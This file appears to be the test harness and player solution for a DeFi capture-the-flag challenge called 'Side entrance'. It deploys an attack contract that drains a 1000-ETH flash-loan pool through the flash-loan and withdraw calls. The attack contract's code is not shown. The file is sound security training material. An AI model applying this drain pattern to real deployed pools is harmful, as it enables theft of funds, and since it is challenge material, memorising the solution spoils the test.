const { ethers } = require("hardhat")
const { expect } = require("chai")
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers")

describe("[Challenge] Side entrance", function () {
  let deployer, player
  let pool

  const ETHER_IN_POOL = 1000n * 10n ** 18n
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    ;[deployer, player] = await ethers.getSigners()

    // Deploy pool and fund it
    pool = await (await ethers.getContractFactory("SideEntranceLenderPool", deployer)).deploy()
    await pool.deposit({ value: ETHER_IN_POOL })
    expect(await ethers.provider.getBalance(pool.address)).to.equal(ETHER_IN_POOL)

    // Player starts with limited ETH in balance
    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE)
    expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE)
  })

  /**
   * A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
   * It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
   * Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.
   */
  /** CODE YOUR SOLUTION HERE */
  it("Execution", async function () {
    let sideEntranceAttack = await (await ethers.getContractFactory("SideEntranceAttack", player)).deploy(pool.address)

    let balance = String(await ethers.provider.getBalance(pool.address))
    console.log(" BALANCE OF POOL BEFORE HACKING: ", balance)

    await sideEntranceAttack.connect(player).executeFlashLoan(balance)
    await sideEntranceAttack.connect(player).withdraw()

    balance = String(await ethers.provider.getBalance(pool.address))
    console.log(" BALANCE OF POOL AFTER HACKING: ", balance)
  })

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player took all ETH from the pool
    expect(await ethers.provider.getBalance(pool.address)).to.be.equal(0)
    expect(await ethers.provider.getBalance(player.address)).to.be.gt(ETHER_IN_POOL)
  })
})
